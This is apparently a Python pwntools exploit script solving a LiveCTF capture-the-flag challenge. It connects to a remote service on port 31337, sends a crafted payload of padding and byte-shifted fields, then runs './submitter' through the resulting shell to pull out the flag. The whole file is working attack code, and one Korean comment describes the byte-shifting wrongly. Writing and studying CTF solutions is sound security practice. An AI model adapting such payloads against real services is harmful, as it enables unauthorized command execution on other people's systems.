#!/usr/bin/env python3

from pwn import *



HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))

context(arch="amd64", os="linux", log_level="debug")

stemina = 0
flag = True
def decrease_bytes(byte_string, value):
    # 입력된 bytes 문자열을 각 문자의 값을 1씩 감소시킨 후 반환
    return bytes([byte + value for byte in byte_string])

payload = b"AAAA"
payload += p16(0x0)
payload += b"AAAA"
bounce = 1

fuzz = p8(4) #fuzz
fuzz += b"fUzZ"
fuzz += p8(0)
fuzz += b"tHiS"
payload += decrease_bytes(fuzz, bounce)
bounce += 1
stemina = 1

wiggle = p8(16)
wiggle += b"U" * 9
stemina += 2
payload += decrease_bytes(wiggle, bounce)
bounce += 1

payload = payload.ljust(0x17c,b"A")
leet = p8(0x40)
leet += p16(10)
leet += b'A'
leet += b'1337133'
payload += decrease_bytes(leet, bounce)
bounce += 1

payload = payload.ljust(0x2b2,b"A")
gravity = p8(0x80)
gravity += p32(0x80000000)
gravity += p32(0x80000000)
gravity += p8(0x0)
payload += decrease_bytes(gravity, bounce)
payload += payload.ljust(1000-len(payload), b"A")

r.send(payload)

# r.interactive()
sleep(2)
r.sendline(b"./submitter")
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)